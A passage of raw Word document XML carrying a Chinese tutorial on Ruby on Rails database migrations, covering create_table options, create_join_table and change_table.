            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="43555B7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create_table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3CA1DCD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t.string :name, :null</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; false</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="28A1CEF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099406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默认在 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>create_table</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 时新增的主键名为 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>id</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">，要改主键的名称，你需要加上 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:primary_key</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 这个选项（不要忘了更新对应 Model 的格式）。如果你根本就不要主键（例如使用多对多连接 HABTM的数据表时），那就传入 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:id =&gt; false</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 。另外，如果要传入某个特定数据表的设定， 你可以在 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:options</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 选项中加上一个SQL片段。例如：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7320"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="03273DEE" w14:textId="77777777" w:rsidTr="002A2B82">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4249D23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create_table :products, :options</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "ENGINE=BLACKHOLE"</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251182F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t.string :name, :null</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; false</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2BDAC79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137F79A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这样在建立数据表的SQL语句中就会加入 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ENGINE=BLACKHOLE</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 。（如果是用 MySQL 的话，预设 是 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ENGINE=InnoDB</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C6BADC1"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3.2 创建连接表</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69F58FA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迁移任务的 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>create_join_table</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法可以创建一张多对多的连接表，经典的写法如下：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4800"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="59F81CC1" w14:textId="77777777" w:rsidTr="002A2B82">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0C9562B3" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1787695135"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>create_join_table :products, :categories</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1E740D0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这里创建了一张名为 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>categories_products</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的连接表，里面包含 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>category_id</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>product_id</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 这两个字段。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6523A0A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你可以通过 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:table_name</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 字段去定义自己想要的数据表名称。例如：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8306"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="0630AE91" w14:textId="77777777" w:rsidTr="002A2B82">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="22D5FBFC" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1431924279"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>create_join_table :products, :categories, :table_name</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; :categorization</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="14A5B71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这里将会创建一张名为 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>categorization</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的数据表。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="346E7D1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默认情况下，</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>create_join_table</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 将会创建两个不包含参数的字段，不过你也可以通过 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:column_options</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 来指定这些参数。例如：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8306"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="08382BAA" w14:textId="77777777" w:rsidTr="002A2B82">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0DC2E0D6" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="448358603"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>create_join_table :products, :categories, :column_options</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; {:null</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tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6DEFDBE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这里将会创建允许为空的</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>product_id</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>category_id</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>字段。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25D3B071"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3.3 变更数据表</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4524A73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要变更现有的数据表，可以用 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>create_table</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的类似方法 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>change_table</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">。它的用法跟 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>create_table</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 差不多，但它的代码块有更多的方式。例如：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3840"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="1E8E4A42" w14:textId="77777777" w:rsidTr="002A2B82">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2A2F730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change_table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795C6DB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t.remove :description, :name</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="69E9083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t.string :part_number</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2BEC71C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t.index :part_number</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="28D4E22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t.rename :upccode, :upc_code</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="09F5321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53C3938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移除了两个字段 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>description</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>name</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">，创建了一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>part_number</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的字符串类型字段并 为其添加了索引。最后重命名了 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>upccode</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 字段。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10FF7BCF"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3.4 特殊方法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="343D7EE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有些功能很常用，例如 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>created_at</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>updated_at</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
